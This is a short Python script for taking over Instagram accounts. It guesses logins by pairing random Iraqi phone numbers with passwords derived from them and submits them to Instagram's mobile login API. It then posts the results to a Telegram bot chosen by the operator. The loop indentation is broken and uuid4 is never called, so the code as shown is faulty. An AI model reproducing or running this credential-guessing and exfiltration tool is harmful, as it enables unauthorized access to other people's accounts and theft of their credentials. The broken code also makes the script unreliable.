import requests
import random
from uuid import uuid4

token = input ("Enter your Token : ")
id = input (" Enter  your ID tele : ")
url = 'https://b.i.instagram.com/api/v1/accounts/login/'

headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}

while True:
     num = "1234567890"
user = str(''.join(random.choice(num) for i in range(8)))
username = str("+96477"+user)
password = str("077"+user)
uid = str(uuid4)
data = {
'uuid':uid,
'password':password,
'username':username,
'device_id':uid,
'from_reg':'false',
'_csrftoken':'missing',
'login_attempt_countn':'0'
}
req = requests.post(url,headers=headers,data=data).text
if str("logged_in_user") in str(req):
    print("Done : {}:{}".format(username,password))
text = f"""
username : {username}
passowrd : {password}
tele : @Marko_Py , @BBZZD
"""
tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=\n {text} \n"
i = requests.post(tlg)
